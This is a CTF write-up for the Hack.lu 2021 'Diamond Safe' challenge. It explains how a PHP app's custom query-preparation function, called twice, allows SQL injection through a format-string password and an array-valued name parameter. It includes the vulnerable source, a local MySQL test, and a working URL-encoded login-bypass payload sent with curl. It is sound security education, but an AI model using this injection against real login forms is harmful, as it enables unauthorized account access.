# Hack.lu CTF 2021 - Diamond Safe (web/php)

![Main Page](img/main_page.png)

[Hacl.lu CTF](https://flu.xxx/) was a great surprise for me as a never heard about it before. And it's rated 94.98! It is organized by the official CTF team of the german Ruhr University Bochum (RUB).

I was able to take a look at only one challenge, and that was really fun and creative.

## The Challenge

![Main Page](img/logo.png)

In this challenge, made by [@kunte_](https://twitter.com/kunte_ctf?s=20), we have a vault for storing safe data (like a simpler Last Pass).
It is password-protected and without registration, so we also have to find our way in.

The challenge give us the php source code and docker compose configuration, so we have a place to start and test locally.

There is a vault page, but it is session-protected, so we have to bypass the Login anyway.

## Breaking the login

The source code is kind of big, so we won't get into the usual detailed-level analysis.
First, let's analyze how to bypass the login.

### Database: Prepare Query

```php
public static function prepare($query, $args){
    if (is_null($query)){
        return;
    }
    if (strpos($query, '%') === false){
        error('%s not included in query!');
        return;
    }

    // get args
    $args = func_get_args();
    array_shift( $args );

    $args_is_array = false;
    if (is_array($args[0]) && count($args) == 1 ) {
        $args = $args[0];
        $args_is_array = true;
    }

    $count_format = substr_count($query, '%s');

    if($count_format !== count($args)){
        error('Wrong number of arguments!');
        return;
    }
    // escape
    foreach ($args as &$value){
        $value = static::$db->real_escape_string($value);
    }

    // prepare
    $query = str_replace("%s", "'%s'", $query);
    $query = vsprintf($query, $args);
    return $query;

}
```

#### **Summary**:
* This function "prepares" the query to run in the database, replacing the bind variables with actual values.
* It does not use real bind variables of the DB driver, but makes it's own implementation of it.
* It uses string formatting to replace the variables, like **"SELECT * FROM TABLES WHERE COL = %s"**, where **%s** is a string
* The function also receives the values for the variables, which can be an array.
* This function has two protection measures:
    * It uses the **real_escape_string** of the mysqli object, to replace any dangerous values in the bind variables, for SQL-injection purposes, like single quotes (**'**).
    * It replaces the **%s** formatted values for **'%s'**, so the formatted value at the end enclosed by single quotes.
* At last, it applies the string formatting with the **vsprintf** function, now that it is safe to replace the values. (Isn't it?)
* It does not run the query. It returns the formatted string, ready to run, with the **commit** function in our database class.

The fact that he made it's own implementation of a function so critical for security is the lead that we need. I took some trying to find a direct vulnerability in this function to SQL-inject, but couldn't find.
The strategy taken here is flawed, but we can see it clearly in a later step.

### Login Validation

```php
if (isset($_POST['password'])){
    $query = db::prepare("SELECT * FROM `users` where password=sha1(%s)", $_POST['password']);

    if (isset($_POST['name'])){
        $query = db::prepare($query . " and name=%s", $_POST['name']);
    }
    else{
        $query = $query . " and name='default'";
    }
    $query = $query . " limit 1";

    $result = db::commit($query);

    if ($result->num_rows > 0){
        $_SESSION['is_auth'] = True;
        $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
        $_SESSION['ip'] = get_ip();
        $_SESSION['user'] = $result->fetch_row()[1];

        success('Welcome to your vault!');
        redirect('vault.php', 2);
    }
    else{
        error('Wrong login or password.');
    }
}
```

#### **Summary**:
* This is only the authentication validation part of the login.php code.
* It first PREPAREs the DB query to validate the password, using sha1 function to encrypt the password and compare to the database already encrypted value.
* If there is a **name** parameter, prepares the (ALREADY PREPARED) SQL query, while concatenating the name validation. If there is no name, just use the "default".
* Calls the **commit** function to execute the final SQL query.
* If it returns at least one row, it gives the user an authentication session.
    * It gets the second column (username) and give it to the **user** session value.
* If it does not returns any line, just give the user an error message.

### Not-that-obvious flaw

Now that "query preparation strategy flaw" I mentioned before gets more evident.
In professional implementations, the query preparation returns a pointer to a SQL query where you can run without having to compile it again.

Here, it returns a string with the bind variable processed (but not executed). But note that **it calls the prepare function TWICE** if you send the **name** parameter. That is the opportunity we wanted.

Let's first understand what happens in a happy path:

* Assume we send the user **neptunian** and password **mysecret**.
* The call would be like this:

```bash
curl -v 'https://diamond-safe.flu.xxx/login.php' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'cookie: PHPSESSID=3d9dc29debc998c9c40b3007319ebed5' \
  --data-raw 'password=mysecret&name=neptunian' \
  --compressed
```

* It will, at first, prepare the query with the password:

```sql
SELECT * FROM `users` where password=sha1(%s)
```

and after preparing:

```sql
SELECT * FROM `users` where password=sha1('mysecret')
```

* Then, it will concatenate the username:

```sql
SELECT * FROM `users` where password=sha1('mysecret') and name=%s
```

and after **PREPARING AGAIN WITH THE PREVIOUS STRING**:

```sql
SELECT * FROM `users` where password=sha1('mysecret') and name='neptunian'
```

This two-step preparation gives our breach. In the second time, it prepares the query wich already includes a string of our control: the password. If we inject a format string in the password, it will be processed!

Also note that it does not validate the data type of the name parameter, so we can send an array, which will be passed directly to the prepare function!

### Hacky Path

![Main Page](img/inception_levels.jpg)

Let's first understand the problem:

* Assume we send the user as an array **["neptunian1", "neptunian2"]** and password **mysecret%s**.

The POST data would be:

```
password=mysecret%s&name[]=neptunian1&name[]=neptunian1
```

* Note that, since **name** is now an array, we send it twice, with brackets after the parameter name.
But we have to URLEncode it first:

```
password=mysecret%25s&name[]=neptunian1&name[]=neptunian1
```

* Now, that same first pass of preparation will end like this:

```sql
SELECT * FROM `users` where password=sha1('mysecret%s')
```

and after concatenating the name:

```sql
SELECT * FROM `users` where password=sha1('mysecret%s') and name=%s
```

Now we have 2 directives!
Since we sent an array to the name, it will format (using vsprintf) each one, in order and enclose it with - wait for it - single-quotes!

```sql
SELECT * FROM `users` where password=sha1('mysecret'neptunian1'') and name='neptunian2'
```

OK!! So we can't send single quotes in the values because it is filtered, but the second pass in the prepare function injects it for us! 
This version of the query will not work, since we generated an invalid SQL here, for simplicity purposes, but if we play a little bit more with the "first" name in the array, we can generate a valid query.

Let's change the first name from **neptunian1** to **) or 2<>(** and the second name to **default** (since is the existing user).

Now the generated query is the valid:

```sql
SELECT * FROM `users` where password=sha1('mysecret') or 2<>('') and name='default'
```

Let's try it in our local mysql docker from the challenge.

```
root@5ef6f217a963:/# mysql -u root -p                
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.7.36 MySQL Community Server (GPL)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use web
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

mysql> SELECT * FROM `users` where password=sha1('mysecret') or 2<>('') and name='default';
+----+---------+------------------------------------------+
| id | name    | password                                 |
+----+---------+------------------------------------------+
|  1 | default | 923b69c88c8af603e767f0a78f4e932170d6638b |
+----+---------+------------------------------------------+
1 row in set (0.00 sec)

mysql>
```

We got our SQL Injection plan!

### Breaking the login

Let's now prepare the POST data:

```
password=mysecret%s&name[]=) or 2<>(&name[]=default
```

We have to URLEncode the POST data values:

```javascript
$ node
Welcome to Node.js v14.12.0.
Type ".help" for more information.
> encodeURI('mysecret%s')
'mysecret%25s'
> encodeURI(') or 2<>(')
')%20or%202%3C%3E('
>
```

And we got our payload:

```
password=mysecret%25s&name[]=)%20or%202%3C%3E(&name[]=default
```

We are now ready to test our hack in the field, using our cookie value to login in the same session of the browser:

```bash
curl 'https://diamond-safe.flu.xxx/login.php' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'cookie: PHPSESSID=3d9dc29debc998c9c40b3007319ebed5' \
  --data-raw 'password=mysecret%25s&name[]=)%20or%202%3C%3E(&name[]=default'
```

Enough bullshit. Run it!

```html
$ curl 'https://diamond-safe.flu.xxx/login.php' \
>   -H 'content-type: application/x-www-form-urlencoded' \
>   -H 'cookie: PHPSESSID=3d9dc29debc998c9c40b3007319ebed5' \
>   --data-raw 'password=mysecret%25s&name[]=)%20or%202%3C%3E(&name[]=default'
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Diamond Safe</title>
        <meta charset="utf-8">
        <script src="/static/jquery-3.2.1.min.js"></script>
        <script src="/static/bootstrap.min.js"></script>
        <link rel="stylesheet" href="/static/bootstrap.min.css">
        <link rel="stylesheet" href="/static/main.css">
        <link rel="icon" type="image/png" href="/static/favicon.png">
    </head>
    <body>
        <div class="container">
            <br>
            <nav class="navbar navbar-default navbar">
                <div class="container-fluid">
                    <div class="navbar-header">
                        <a class="navbar-brand">Diamond Safe</a>
                    </div>
                    <ul class="nav navbar-nav">
                        <li><a href="/index.php">About</a></li>
                        <li class="active"><a href="/login.php">Login</a></li>
                    </ul>
                </div>
            </nav>
        </div>
        <div class="container container-body">
<div class='alert alert-success'><strong>Welcome to your vault!</strong></div><meta http-equiv='refresh' content='2;vault.php'>        <div class='footer'> 2021 | STOINKS AG</div><br>
    </body>
</html>
```
Hacked!

```Welcome to your vault!```

![Main Page](img/vault.png)

## References

* Hack.lu CTF 2021: https://flu.xxx/
* CTF Time Event: https://ctftime.org/event/1452/
* SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
* Format String Attack: https://owasp.org/www-community/attacks/Format_string_attack
* Repo with the artifacts discussed here: https://github.com/Neptunians/hack.lu-ctf-2021
* Team: [FireShell](https://fireshellsecurity.team/)
* Team Twitter: [@fireshellst](https://twitter.com/fireshellst)
* Follow me too :) [@NeptunianHacks](twitter.com/NeptunianHacks)